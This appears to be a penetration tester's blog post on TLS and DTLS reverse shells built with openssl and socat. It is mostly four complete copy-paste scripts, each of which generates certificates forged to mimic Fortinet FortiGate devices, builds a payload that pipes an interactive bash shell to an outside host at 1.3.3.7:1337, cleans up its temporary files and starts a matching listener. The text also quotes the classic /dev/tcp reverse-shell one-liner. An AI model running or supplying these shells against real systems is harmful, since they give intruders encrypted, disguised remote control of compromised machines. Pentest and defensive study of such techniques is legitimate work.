---
title: TLS Reverse Shells
authors: [dadevel]
date: 2025-09-08
image: keyboard.webp
draft: false
---

In a recent pentest I had code execution on an internal system, but was too lazy to deploy a full C2.
Instead, I wanted to go for a classic reverse shell.  
Of course, the trusty old `bash -i >& /dev/tcp/1.3.3.7/1337 0>&1` is totally unsuited for connections across the internet.
Therefore, I looked at reverse shells over TLS and DTLS (TLS over UDP), since they provide proper encryption and mutual authentication.

I ended up with payloads based on `openssl` and `socat`.
Although `openssl` might be preinstalled, the advantage of `socat` is that it can spawn a PTY on its own, which makes a separate [shell upgrade](https://0xffsec.com/handbook/shells/full-tty/) unnecessary.
`socat` can be [built from source](https://github.com/andrew-d/static-binaries/tree/master/socat) or [downloaded as static binary](https://github.com/ernw/static-toolbox/releases) for various architectures.

Several combinations of payloads and listeners can be found below.
Each snippet first generates the needed keys and certificates, then copies the payload to the clipboard and finally starts the listener.

# OpenSSL TLS Reverse Shell

~~~ bash
HOST=1.3.3.7
PORT=1337
CLIENTNAME=FGT1KD3$RANDOM$RANDOM
SERVERNAME=FGT1KD3$RANDOM$RANDOM
CLIENTSUBJECT=/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiGate/CN=$CLIENTNAME/emailAddress=support@fortinet.com
SERVERSUBJECT=/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiGate/CN=$SERVERNAME/emailAddress=support@fortinet.com
openssl req -quiet -newkey ed25519 -nodes -x509 -days 365 -subj $CLIENTSUBJECT -keyout ./client.key -out ./client.crt
openssl req -quiet -newkey ed25519 -nodes -x509 -days 365 -subj $SERVERSUBJECT -keyout ./server.key -out ./server.crt
CLIENTCRT=$(base64 -w0 ./client.crt)
SERVERCRT=$(base64 -w0 ./server.crt)
CLIENTPEM=$(cat ./client.key ./client.crt | tee ./client.pem | base64 -w0)
SERVERPEM=$(cat ./server.key ./server.crt | tee ./server.pem | base64 -w0)
TMP1=/dev/shm/$RANDOM
TMP2=/dev/shm/$RANDOM
TMP3=/dev/shm/$RANDOM
cat << EOF | wl-copy
echo $SERVERCRT|base64 -d>$TMP1;echo $CLIENTPEM|base64 -d>$TMP2;rm -f $TMP3;mkfifo $TMP3;bash -i<$TMP3 2>&1|openssl s_client -quiet -CAfile $TMP1 -cert $TMP2 -verify_return_error -connect $HOST:$PORT>$TMP3;rm -f $TMP1 $TMP2 $TMP3
EOF
socat -dd openssl-listen:$PORT,cafile=./client.crt,cert=./server.pem,commonname=$CLIENTNAME,reuseaddr readline
~~~

# OpenSSL DTLS Reverse Shell

~~~ bash
HOST=1.3.3.7
PORT=1337
CLIENTNAME=FGT1KD3$RANDOM$RANDOM
SERVERNAME=FGT1KD3$RANDOM$RANDOM
CLIENTSUBJECT=/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiGate/CN=$CLIENTNAME/emailAddress=support@fortinet.com
SERVERSUBJECT=/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiGate/CN=$SERVERNAME/emailAddress=support@fortinet.com
openssl req -quiet -newkey rsa:2048 -nodes -x509 -days 365 -subj $CLIENTSUBJECT -keyout ./client.key -out ./client.crt
openssl req -quiet -newkey rsa:2048 -nodes -x509 -days 365 -subj $SERVERSUBJECT -keyout ./server.key -out ./server.crt
CLIENTCRT=$(base64 -w0 ./client.crt)
SERVERCRT=$(base64 -w0 ./server.crt)
CLIENTPEM=$(cat ./client.key ./client.crt | tee ./client.pem | base64 -w0)
SERVERPEM=$(cat ./server.key ./server.crt | tee ./server.pem | base64 -w0)
TMP1=/dev/shm/$RANDOM
TMP2=/dev/shm/$RANDOM
TMP3=/dev/shm/$RANDOM
cat << EOF | wl-copy
echo $SERVERCRT|base64 -d>$TMP1;echo $CLIENTPEM|base64 -d>$TMP2;rm -f $TMP3;mkfifo $TMP3;bash -i<$TMP3 2>&1|openssl s_client -quiet -dtls -CAfile $TMP1 -cert $TMP2 -verify_return_error -connect $HOST:$PORT>$TMP3;rm -f $TMP1 $TMP2 $TMP3
EOF
socat -dd openssl-dtls-server:$PORT,cafile=./client.crt,cert=./server.pem,commonname=$CLIENTNAME,reuseaddr readline
~~~

# Socat TLS Reverse Shell

~~~ bash
HOST=1.3.3.7
PORT=1337
CLIENTNAME=FGT1KD3$RANDOM$RANDOM
SERVERNAME=FGT1KD3$RANDOM$RANDOM
CLIENTSUBJECT=/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiGate/CN=$CLIENTNAME/emailAddress=support@fortinet.com
SERVERSUBJECT=/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiGate/CN=$SERVERNAME/emailAddress=support@fortinet.com
openssl req -quiet -newkey ed25519 -nodes -x509 -days 365 -subj $CLIENTSUBJECT -keyout ./client.key -out ./client.crt
openssl req -quiet -newkey ed25519 -nodes -x509 -days 365 -subj $SERVERSUBJECT -keyout ./server.key -out ./server.crt
CLIENTCRT=$(base64 -w0 ./client.crt)
SERVERCRT=$(base64 -w0 ./server.crt)
CLIENTPEM=$(cat ./client.key ./client.crt | tee ./client.pem | base64 -w0)
SERVERPEM=$(cat ./server.key ./server.crt | tee ./server.pem | base64 -w0)
TMP1=/dev/shm/$RANDOM
TMP2=/dev/shm/$RANDOM
cat << EOF | wl-copy
echo $SERVERCRT|base64 -d>$TMP1;echo $CLIENTPEM|base64 -d>$TMP2;socat openssl:$HOST:$PORT,cafile=$TMP1,cert=$TMP2,commonname=$SERVERNAME exec:bash,pty,stderr,setsid,sigint,sane;rm -f $TMP1 $TMP2
EOF
socat -dd openssl-listen:$PORT,cafile=./client.crt,cert=./server.pem,commonname=$CLIENTNAME,reuseaddr file:$(tty),raw,echo=0
~~~

# Socat DTLS Reverse Shell

~~~ bash
HOST=1.3.3.7
PORT=1337
CLIENTNAME=FGT1KD3$RANDOM$RANDOM
SERVERNAME=FGT1KD3$RANDOM$RANDOM
CLIENTSUBJECT=/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiGate/CN=$CLIENTNAME/emailAddress=support@fortinet.com
SERVERSUBJECT=/C=US/ST=California/L=Sunnyvale/O=Fortinet/OU=FortiGate/CN=$SERVERNAME/emailAddress=support@fortinet.com
openssl req -quiet -newkey rsa:2048 -nodes -x509 -days 365 -subj $CLIENTSUBJECT -keyout ./client.key -out ./client.crt
openssl req -quiet -newkey rsa:2048 -nodes -x509 -days 365 -subj $SERVERSUBJECT -keyout ./server.key -out ./server.crt
CLIENTCRT=$(base64 -w0 ./client.crt)
SERVERCRT=$(base64 -w0 ./server.crt)
CLIENTPEM=$(cat ./client.key ./client.crt | tee ./client.pem | base64 -w0)
SERVERPEM=$(cat ./server.key ./server.crt | tee ./server.pem | base64 -w0)
TMP1=/dev/shm/$RANDOM
TMP2=/dev/shm/$RANDOM
cat << EOF | wl-copy
echo $SERVERCRT|base64 -d>$TMP1;echo $CLIENTPEM|base64 -d>$TMP2;socat openssl-dtls-client:$HOST:$PORT,cafile=$TMP1,cert=$TMP2,commonname=$SERVERNAME exec:bash,pty,stderr,setsid,sigint,sane;rm -f $TMP1 $TMP2
EOF
socat -dd openssl-dtls-server:$PORT,cafile=./client.crt,cert=./server.pem,commonname=$CLIENTNAME,reuseaddr file:$(tty),raw,echo=0
~~~
